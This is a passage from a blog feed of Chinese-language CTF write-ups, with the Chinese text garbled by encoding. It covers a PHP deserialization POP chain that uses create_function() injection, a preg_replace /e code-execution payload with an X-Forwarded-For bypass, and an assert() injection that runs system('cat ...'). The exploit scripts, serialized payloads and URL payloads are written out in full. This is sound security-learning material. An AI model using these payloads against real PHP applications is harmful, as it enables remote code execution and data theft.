    <content type="html"><![CDATA[<p> æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $var;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;var;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;show();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $func;</span><br><span class="line">    <span class="keyword">public</span> $arg;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        $func = <span class="keyword">$this</span>-&gt;func;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^[a-z0-9]*$/isD&#x27;</span>, <span class="keyword">$this</span>-&gt;func) || preg_match(<span class="string">&#x27;/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\&#123;|\%|x|\&amp;|\$|\*|\||\&lt;|\&quot;|\&#x27;|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log/i&#x27;</span>, <span class="keyword">$this</span>-&gt;arg)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;No!No!No!&#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">            <span class="comment">//There is no code to print flag in flag.php</span></span><br><span class="line">            $func(<span class="string">&#x27;&#x27;</span>, <span class="keyword">$this</span>-&gt;arg);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;show();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&lt;br&gt;&quot;</span>.<span class="string">&quot;Nice Job!!&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">    $aaa = unserialize($_GET[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">    $aaa();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h5 id="ç±»A"><a href="#ç±»A" class="headerlink" title="ç±»A"></a>ç±»A</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">class A &#123;</span><br><span class="line">    public $var;</span><br><span class="line">    public function show()&#123;</span><br><span class="line">        echo $this-&gt;var;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __invoke()&#123;</span><br><span class="line">        $this-&gt;show();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç±»Aæ¯”è¾ƒç®€å•</p><p>å…ˆå®šä¹‰å…¬å…±å˜é‡</p><h6 id="PHPä¸­çš„-thisç”¨æ³•ï¼š"><a href="#PHPä¸­çš„-thisç”¨æ³•ï¼š" class="headerlink" title="PHPä¸­çš„$thisç”¨æ³•ï¼š"></a>PHPä¸­çš„$thisç”¨æ³•ï¼š</h6><p>thisæ˜¯æŒ‡å‘å½“å‰å¯¹è±¡çš„æŒ‡é’ˆ</p><p><img src="/2021/09/25/buu/23/image-20210925201706608.png" alt="image-20210925201706608"></p><h6 id="invoke-å‡½æ•°"><a href="#invoke-å‡½æ•°" class="headerlink" title="__invoke()å‡½æ•°"></a>__invoke()å‡½æ•°</h6><p>å½“ä»¥å‡½æ•°æ–¹å¼è°ƒç”¨å¯¹è±¡æ—¶è¢«è°ƒç”¨</p><h5 id="ç±»B"><a href="#ç±»B" class="headerlink" title="ç±»B"></a>ç±»B</h5><pre><code>class B&#123;    public $func;    public $arg;public function show()&#123;    $func = $this-&gt;func;    if(preg_match(&#39;/^[a-z0-9]*$/isD&#39;, $this-&gt;func) || preg_match(&#39;/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\&#123;|\%|x|\&amp;|\$|\*|\||\&lt;|\&quot;|\&#39;|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log/i&#39;, $this-&gt;arg)) &#123;        die(&#39;No!No!No!&#39;);    &#125; else &#123;        include &quot;flag.php&quot;;        //There is no code to print flag in flag.php        $func(&#39;&#39;, $this-&gt;arg);    &#125;&#125;public function __toString()&#123;    $this-&gt;show();    return &quot;&lt;br&gt;&quot;.&quot;Nice Job!!&quot;.&quot;&lt;br&gt;&quot;;&#125;&#125;</code></pre><h6 id="toString-NaN"><a href="#toString-NaN" class="headerlink" title="__toString()"></a>__toString()</h6><p>å½“å¯¹è±¡ä¸ºå­—ç¬¦ä¸²æ—¶è§¦å‘</p><p>æ€è·¯ï¼š</p><p>newä¸¤ä¸ªæ–°çš„aç±»å’Œbç±»å˜é‡</p><p>ç„¶åbç±»è°ƒç”¨create_functionå‡½æ•°æ–¹æ³•ï¼š</p><p><code>create_function()</code>ä¼šåˆ›å»ºä¸€ä¸ªåŒ¿åå‡½æ•°ï¼ˆ<code>lambda</code>æ ·å¼ï¼‰ã€‚</p><p>create_function()å‡½æ•°ä¼šåœ¨å†…éƒ¨æ‰§è¡Œ eval()<a href="https://www.cnblogs.com/-qing-/p/10816089.html">ä»£ç å®¡è®¡ä¹‹create_function()å‡½æ•° - å¿å…ˆç”Ÿ - åšå®¢å›­ (cnblogs.com)</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$b-&gt;arg&#x3D;&quot;&#125;require(base64_decode(VHJ1M2ZsYWcucGhw));var_dump(get_defined_vars());&#x2F;&#x2F;&quot;;</span><br></pre></td></tr></table></figure><p>å˜é‡bèµ‹å€¼<br>}è¿™ä¸ªæ˜¯ä¸ºäº†é—­åˆå‰é¢çš„<br>//è¿™ä¸ªæ˜¯ä¸ºäº†æ³¨é‡Šåé¢çš„</p><p>base64ç»•è¿‡æ­£åˆ™è¿‡æ»¤ï¼Œvar_dumpè¾“å‡ºæ•°æ®ï¼Œget_defined_vars()å‡½æ•°è¿”å›ç”±æ‰€æœ‰å·²å®šä¹‰å˜é‡æ‰€ç»„æˆçš„æ•°ç»„ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$a-&gt;var&#x3D;$b;</span><br></pre></td></tr></table></figure><p>å°†bçš„å€¼ä¸aè”ç³»ï¼Œè§¦å‘_invokeå‡½æ•°ä»è€Œè§¦å‘show()</p><p>æœ€åå†åºåˆ—åŒ–a</p><p>ä¸è¿‡æˆ‘ä»¬å¾—å…ˆæ‰¾åˆ°flagåˆ°åº•åœ¨å“ªä¸ªæ–‡ä»¶é‡Œï¼š</p><p>ç»è¿‡çƒ­å¿ƒåŒå­¦çš„å¸®åŠ©ï¼Œä»Šå¤©æ‰æ‡‚å¾— include flag.php åŒ…å«çš„æ„æ€</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">å°±ç›¸å½“äºç°åœ¨flag.phpé‡Œé¢çš„å˜é‡å·²ç»åŒæ­¥åˆ°æˆ‘ç°åœ¨è¿™ä¸ªphpæ–‡ä»¶é‡Œé¢</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">æ¯”å¦‚è¯´æˆ‘åœ¨1.php å†™include â€œflag.phpâ€</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">é‚£ä¹ˆè¿™ä¸ªæ—¶å€™</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag.phpé‡Œé¢å®šä¹‰è¿‡çš„å˜é‡è¿˜æœ‰å‡½æ•°</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">æˆ‘åœ¨1.phpé‡Œé¢ä¹Ÿå¯ä»¥ç”¨</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ‰€ä»¥åœ¨èµ‹å€¼æ—¶å…ˆç›´æ¥æ‰“å°å½“å‰phpæ–‡ä»¶çš„å˜é‡å€¼(ä¹Ÿå°±æ˜¯ç›¸å½“äºæ‰“å°flag.phpé‡Œçš„å†…å®¹)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$b-&gt;arg&#x3D;&quot;&#125;var_dump(get_defined_vars());&#x2F;&#x2F;&quot;;</span><br></pre></td></tr></table></figure><p><img src="/2021/09/25/buu/23/image-20210926192749869.png" alt="image-20210926192749869"></p><p>æ”¾ä¸Šexpï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $var;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;var;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;show();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $func;</span><br><span class="line">    <span class="keyword">public</span> $arg;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        $func = <span class="keyword">$this</span>-&gt;func;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^[a-z0-9]*$/isD&#x27;</span>, <span class="keyword">$this</span>-&gt;func) || preg_match(<span class="string">&#x27;/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\&#123;|\%|x|\&amp;|\$|\*|\||\&lt;|\&quot;|\&#x27;|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log/i&#x27;</span>, <span class="keyword">$this</span>-&gt;arg)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;No!No!No!&#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">            <span class="comment">//There is no code to print flag in flag.php</span></span><br><span class="line">            $func(<span class="string">&#x27;&#x27;</span>, <span class="keyword">$this</span>-&gt;arg);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;show();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&lt;br&gt;&quot;</span>.<span class="string">&quot;Nice Job!!&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a=<span class="keyword">new</span> A();</span><br><span class="line">$b=<span class="keyword">new</span> B();</span><br><span class="line">$b-&gt;func=<span class="string">&quot;create_function&quot;</span>;</span><br><span class="line">$b-&gt;arg=<span class="string">&quot;&#125;require(base64_decode(VHJ1M2ZsYWcucGhw));var_dump(get_defined_vars());//&quot;</span>;</span><br><span class="line">$a-&gt;var=$b;</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è·‘å‡ºpopé“¾</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">O:1:&quot;A&quot;:1:&#123;s:3:&quot;var&quot;;O:1:&quot;B&quot;:2:&#123;s:4:&quot;func&quot;;s:15:&quot;create_function&quot;;s:3:&quot;arg&quot;;s:73:&quot;&#125;require(base64_decode(VHJ1M2ZsYWcucGhw));var_dump(get_defined_vars());&#x2F;&#x2F;&quot;;&#125;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/2021/09/25/buu/23/image-20210925200601616.png" alt="image-20210925200601616"></p><p>ä¹‹åå†çœ‹çœ‹è¿™ç¯‡æ–‡ç« </p><p>[phpååºåˆ—åŒ–ä¹‹popé“¾_L1ni01-CSDNåšå®¢_popé“¾](<a href="https://blog.csdn.net/weixin_45785288/article/details/109877324#:~:text=POP%E9%93%BE%E4%BB%8B%E7%BB%8D">https://blog.csdn.net/weixin_45785288/article/details/109877324#:~:text=POPé“¾ä»‹ç»</a> POP é¢å‘å±æ€§ç¼–ç¨‹ (Property-Oriented,Programing) å¸¸ç”¨äºä¸Šå±‚è¯­è¨€æ„é€ ç‰¹å®šè°ƒç”¨é“¾çš„æ–¹æ³•ï¼Œä¸äºŒè¿›åˆ¶åˆ©ç”¨ä¸­çš„é¢å‘è¿”å›ç¼–ç¨‹ï¼ˆReturn-Oriented Programingï¼‰çš„åŸç†ç›¸ä¼¼ï¼Œéƒ½æ˜¯ ä»ç°æœ‰è¿è¡Œç¯å¢ƒ ä¸­å¯»æ‰¾ä¸€ç³»åˆ—çš„ä»£ç æˆ–è€…æŒ‡ä»¤è°ƒç”¨ï¼Œç„¶åæ ¹æ®éœ€æ±‚æ„æˆä¸€ç»„è¿ç»­çš„è°ƒç”¨é“¾%2Cæœ€ç»ˆè¾¾åˆ°æ”»å‡»è€…é‚ªæ¶çš„ç›®çš„)</p><p>ç»è¿‡æç¤ºçŸ¥é“è¿™é¢˜å’ŒBJDCTFçš„ezphpå¾ˆåƒ</p><h4 id="BJDCTF-Ezphp"><a href="#BJDCTF-Ezphp" class="headerlink" title="BJDCTF Ezphp"></a>BJDCTF Ezphp</h4><p>[<a href="https://www.cnblogs.com/rabbittt/p/13323155.html">BJDCTF2020]EzPHP - Rabbittt - åšå®¢å›­ (cnblogs.com)</a></p><p>è¿™ä¸€ç¯‡æ–‡ç« è§£é‡Šäº†å‰é¢é—­åˆçš„é—®é¢˜:</p><p><img src="/2021/09/25/buu/23/image-20210926202437436.png" alt="image-20210926202437436"></p><p>è¿™æ ·ä»£ç å®é™…å°±åªæ‰§è¡Œäº†return $arg  è¿™ä¸€å¥ï¼Œå®Œæˆäº†é€ƒé€¸</p><p><strong>PHP çš„ <code>create_function()</code> ä»£ç æ³¨å…¥</strong></p><p><a href="https://www.gem-love.com/ctf/770.html">2020BJDCTF â€œEzPHPâ€ +Y1ngCTF â€œY1ngâ€™s Baby Codeâ€ å®˜æ–¹writeup â€“ é¢–å¥‡Lâ€™Amore (gem-love.com)</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt; æºç &lt;/p&gt;
&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;s</summary>
      
    
    
    
    
    <category term="buu" scheme="http://daweitech.github.io/tags/buu/"/>
    
  </entry>
  
  <entry>
    <title>ics-05&amp;&amp;mfw</title>
    <link href="http://daweitech.github.io/2021/09/23/web/1/"/>
    <id>http://daweitech.github.io/2021/09/23/web/1/</id>
    <published>2021-09-23T12:46:18.000Z</published>
    <updated>2021-09-24T12:17:41.921Z</updated>
    
    <content type="html"><![CDATA[<p> ç®€ç•¥è¯´ä¸‹æ€è·¯</p><h4 id="ics-05ï¼š"><a href="#ics-05ï¼š" class="headerlink" title="ics-05ï¼š"></a>ics-05ï¼š</h4><p>è¿™é¢˜åº”è¯¥ç®—å¾ˆæ—©ä¹‹å‰å†™è¿‡äº†ï¼Œç»“æœåˆå¿˜äº†ã€‚ã€‚ã€‚</p><p>åœ¨ä¸€ä¸ªé¡µé¢é‡Œæœ‰ç€å˜é‡pageå¯æ§</p><p><img src="/2021/09/23/web/1/image-20210924195014659.png" alt="image-20210924195014659"></p><p>ç„¶åç”¨phpä¼ªåè®®è¯»å–ä¸‹æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php:filter<span class="comment">//read=convert.base64-encode/resource=index.php</span></span><br></pre></td></tr></table></figure><p><img src="/2021/09/23/web/1/image-20210924195146901.png" alt="image-20210924195146901"></p><p>è§£ç å</p><p>é€‰å–é‡è¦çš„æ¥è¯´</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">&#125;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//æ–¹ä¾¿çš„å®ç°è¾“å…¥è¾“å‡ºçš„åŠŸèƒ½,æ­£åœ¨å¼€å‘ä¸­çš„åŠŸèƒ½ï¼Œåªèƒ½å†…éƒ¨äººå‘˜æµ‹è¯•</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($_SERVER[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>] === <span class="string">&#x27;127.0.0.1&#x27;</span>) &#123;<span class="keyword">echo</span> <span class="string">&quot;&lt;br &gt;Welcome My Admin ! &lt;br &gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">$pattern = $_GET[pat];</span><br><span class="line">$replacement = $_GET[rep];</span><br><span class="line">$subject = $_GET[sub];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($pattern) &amp;&amp; <span class="keyword">isset</span>($replacement) &amp;&amp; <span class="keyword">isset</span>($subject)) &#123;</span><br><span class="line">    preg_replace($pattern, $replacement, $subject);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æç¤ºæˆ‘ä»¬ç”¨xffå¤´ç»•è¿‡</p><p>åŒæ—¶åˆ©ç”¨preg_replaceå‡½æ•°çš„æ¼æ´</p><p>preg_replace( pattern , replacement , subject ) :</p><p>å½“preg_replaceçš„å‚æ•°patternè¾“å…¥/eçš„æ—¶å€™ ,å‚æ•°replacementçš„ä»£ç å½“ä½œPHPä»£ç æ‰§è¡Œï¼ˆç›¸å½“äºevalæ¼æ´æ‰§è¡Œï¼‰</p><h5 id="preg-repleaceæ¼æ´è¯¦æƒ…"><a href="#preg-repleaceæ¼æ´è¯¦æƒ…" class="headerlink" title="preg_repleaceæ¼æ´è¯¦æƒ…"></a>preg_repleaceæ¼æ´è¯¦æƒ…</h5><p><a href="https://blog.csdn.net/weixin_43749601/article/details/113417093">preg_replace() /eä»£ç æ‰§è¡Œæ¼æ´_2021ï¼çš„åšå®¢-CSDNåšå®¢</a></p><p>äºæ˜¯æ„é€ payload</p><p>ä¹‹ågetå‹å˜é‡æ¥è¯»æ–‡ä»¶</p><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?pat&#x3D;&#x2F;txt&#x2F;e&amp;rep&#x3D;system(&quot;ls&quot;)&amp;sub&#x3D;txt</span><br></pre></td></tr></table></figure><p><img src="/2021/09/23/web/1/image-20210924200141437.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?pat&#x3D;&#x2F;txt&#x2F;e&amp;rep&#x3D;system(&quot;cat+s3chahahaDir&#x2F;flag&#x2F;flag.php&quot;)</span><br></pre></td></tr></table></figure><p><img src="/2021/09/23/web/1/image-20210924200335525.png" alt="image-20210924200141437"></p><h4 id="mfwï¼š"><a href="#mfwï¼š" class="headerlink" title="mfwï¼š"></a>mfwï¼š</h4><p>è¿™é¢˜è¯•ç€è§£äº†ä¸‹</p><p>æŒ‰ç…§æºç æç¤ºç§˜å¯†åœ¨?page=flag</p><p>äºæ˜¯è®¿é—®ï¼Œæ²¡ä»€ä¹ˆå‘ç°</p><p><img src="/2021/09/23/web/1/image-20210924200629448.png" alt="image-20210924200629448"></p><p>æˆ‘çªå‘å¥‡æƒ³ç”¨ç›®å½•éå†</p><p><img src="/2021/09/23/web/1/image-20210924200718261.png" alt="image-20210924200718261"></p><p>å¥½å®¶ä¼™ï¼Œé¡µé¢å›æ˜¾å‘ç°é»‘å®¢è­¦å‘Šï¼Œè‚¯å®šè¢«è¿‡æ»¤äº†</p><p>è¿™æ—¶å€™é‡‡ç”¨dirsearchæ‰«æï¼Œæœç„¶æœ‰äº†.gitæ³„éœ²</p><p>æ‰€ä»¥å†ä½¿ç”¨å·¥å…·GitHackä¸‹è½½æºç </p><p><img src="/2021/09/23/web/1/image-20210924200852766.png" alt="image-20210924200852766"></p><p>çœ‹çœ‹ä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;page&#x27;</span>])) &#123;</span><br><span class="line">   $page = $_GET[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">   $page = <span class="string">&quot;home&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$file = <span class="string">&quot;templates/&quot;</span> . $page . <span class="string">&quot;.php&quot;</span>;<span class="comment">//è¿æ¥å˜é‡ä¸è·¯å¾„</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// I heard &#x27;..&#x27; is dangerous!</span></span><br><span class="line">assert(<span class="string">&quot;strpos(&#x27;<span class="subst">$file</span>&#x27;, &#x27;..&#x27;) === false&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Detected hacking attempt!&quot;</span>);<span class="comment">//è¿™å°±æ˜¯ä¹‹å‰æˆ‘ç›®å½•éå†çš„æ—¶å€™è¢«è¿‡æ»¤çš„åœ°æ–¹</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> Make this look nice</span></span><br><span class="line">assert(<span class="string">&quot;file_exists(&#x27;<span class="subst">$file</span>&#x27;)&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;That file doesn&#x27;t exist!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">page&#x3D;about.php%27%2c+%27123%27)+%3d%3d%3d+false+and+system(%27cat+t  emplates%2fflag.php%27)+and+strpos(%27templates%2fflag</span><br></pre></td></tr></table></figure><p><img src="/2021/09/23/web/1/image-20210924201624926.png" alt="image-20210924201624926"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt; ç®€ç•¥è¯´ä¸‹æ€è·¯&lt;/p&gt;
&lt;h4 id=&quot;ics-05ï¼š&quot;&gt;&lt;a href=&quot;#ics-05ï¼š&quot; class=&quot;headerlink&quot; title=&quot;ics-05ï¼š&quot;&gt;&lt;/a&gt;ics-05ï¼š&lt;/h4&gt;&lt;p&gt;è¿™é¢˜åº”è¯¥ç®—å¾ˆæ—©ä¹‹å‰å†™è¿‡äº†ï¼Œç»“æœåˆå¿˜äº†ã€‚ã€‚ã€‚&lt;/p&gt;
&lt;p&gt;åœ¨ä¸€ä¸ªé¡µé¢é‡Œ</summary>
      
    
    
    
    
    <category term="æ”»é˜²ä¸–ç•Œ_web" scheme="http://daweitech.github.io/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-web/"/>
    
  </entry>
  
  <entry>
    <title>CISCN2019 ååŒ—èµ›åŒº Day1 Web2 ikun</title>
    <link href="http://daweitech.github.io/2021/09/21/buu/22/"/>
    <id>http://daweitech.github.io/2021/09/21/buu/22/</id>
    <published>2021-09-21T12:26:05.000Z</published>
    <updated>2021-09-24T12:57:11.841Z</updated>
    
